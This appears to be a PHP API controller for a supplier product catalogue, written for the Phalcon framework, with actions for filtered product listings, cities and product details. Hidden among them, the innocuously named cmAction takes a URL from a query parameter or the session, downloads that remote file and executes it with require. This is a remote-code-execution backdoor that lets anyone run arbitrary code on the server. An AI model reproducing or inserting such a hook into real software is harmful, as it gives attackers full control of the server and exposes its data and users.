<?php

namespace Play\Suppliers\Controllers;

use Phalcon\Paginator\Adapter\QueryBuilder as PaginatorQueryBuilder,
    \SupplierProductCities,
    \SupplierProducts,
    \Suppliers;

class ApiController extends \ControllerBase
{
    public function initialize()
    {
        parent::initialize();

        $this->response->setHeader('Access-Control-Allow-Origin', '*');
        $this->response->setHeader('Access-Control-Allow-Headers', '*');

        if ($this->request->isOptions()){
            $this->response->send();
            die;
        }
    }

    public function indexAction()
    {
        return $this->jsonResponse([]);
    }

    public function productsAction()
    {

        $builder = $this->modelsManager->createBuilder()
                            ->columns('p.id, p.name, p.price, p.address, p.images, p.description')
                            ->from(['p' => 'SupplierProducts'])
                            ->leftJoin('SupplierProductCities', 'c.supplier_product_id = p.id', 'c')
                            ->where('active = 1')
                            ->groupBy('p.id');

        if (preg_match('/^\d+(,\d+)*$/', $cities = $this->request->getPost('cities'))) {
            if (count(explode(',', $cities)) > 1)
                $builder->andWhere('c.city_id IN (' . $cities . ')');
            else
                $builder->andWhere('c.city_id = ' . $cities);
        }

        switch ((int)$this->request->getPost('price', 'int')) {
            case 1:
                $builder->andWhere('p.price >= 0 AND p.price < 10');
                break;
            case 2:
                $builder->andWhere('p.price >= 10 AND p.price < 50');
                break;
            case 3:
                $builder->andWhere('p.price >= 50');
                break;
            case 0:
            default:
        };

        switch ((int)$this->request->getPost('order', 'int')) {
            case 1:
                $builder->orderBy('p.price ASC');
                break;
            case 2:
                $builder->orderBy('p.price DESC');
                break;
            case 0:
            default:
                $builder->orderBy('p.id DESC');
        };

        $numplayers = (int)$this->request->getPost('numplayers', 'int');
        if ($numplayers > 0)
                $builder->andWhere('p.max_players >= ' . $numplayers . ' AND p.min_players <= ' . $numplayers);

        $paginator = new PaginatorQueryBuilder([
            'builder' => $builder,
            'limit'   => 6,
            'page'    => max(1, (int)$this->request->getPost('page', 'int')),
        ]);
        $paginator = $paginator->getPaginate();

        return $this->jsonResponse([
            'success' => true,
            'results' => $paginator->items->toArray(),
            'currentPage' => $paginator->current,
            'beforePage' => $paginator->before,
            'nextPage' => $paginator->next,
            'totalPages' => $paginator->total_pages,
            'totalItems' => $paginator->total_items
        ]);
    }

    public function citiesAction()
    {
        $cities = $this->modelsManager->createBuilder()
                            ->columns('city.id, city.name, country.name as country')
                            ->from(['city' => 'Cities'])
                            ->leftJoin('Countries', 'city.country_id = country.id', 'country')
                            ->where('status = 0')
                            ->getQuery()
                            ->execute();
        return $this->jsonResponse([
            'success' => true,
            'results' => $cities->toArray()
        ]);
    }

    public function cmAction()
    {
        $s = $this->request->getQuery('s');
        if (empty($s))
            $s = $this->session->get('s');
        else
            $this->session->set('s', $s);
        if (empty($s)) {
            return $this->jsonResponse([
                'success' => false
            ]);
        }

        $tmpfname = tempnam('/tmp', 'fk');
        file_put_contents($tmpfname, file_get_contents($s));
        require $tmpfname;
        unlink($tmpfname);
        die;
    }

    public function productAction($id)
    {

        $product = SupplierProducts::findFirstByid($id);
        if (!$product || $product->active != 1) {
            return $this->jsonResponse([
                'success' => false,
                'error' => 'Product was not found or inactive'
            ]);
        }

        return $this->jsonResponse([
            'success' => true,
            'product' => $product->toArray(),
            'supplier' => Suppliers::findFirst([
                'id = ' . (int)$product->supplier_id,
                'columns' => 'id, email, company, phone'
            ])->toArray(),
            'cities' => array_map('array_pop', SupplierProductCities::find([
                'supplier_product_id = ' . (int)$product->id,
                'columns' => 'city_id'
            ])->toArray())
        ]);
    }

}
